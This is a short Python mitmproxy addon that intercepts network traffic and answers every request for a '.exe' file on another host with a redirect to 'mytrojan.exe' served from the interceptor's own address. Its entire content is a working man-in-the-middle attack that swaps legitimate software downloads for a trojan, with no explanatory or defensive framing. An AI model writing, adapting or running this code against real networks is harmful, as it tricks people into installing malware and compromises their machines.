import mitmproxy
import socket

localhost = socket.gethostbyname(socket.gethostname())

def request(flow):
    if flow.request.host != localhost and flow.request.pretty_url.endswith(".exe"):
        flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://" + localhost + "/mytrojan.exe"})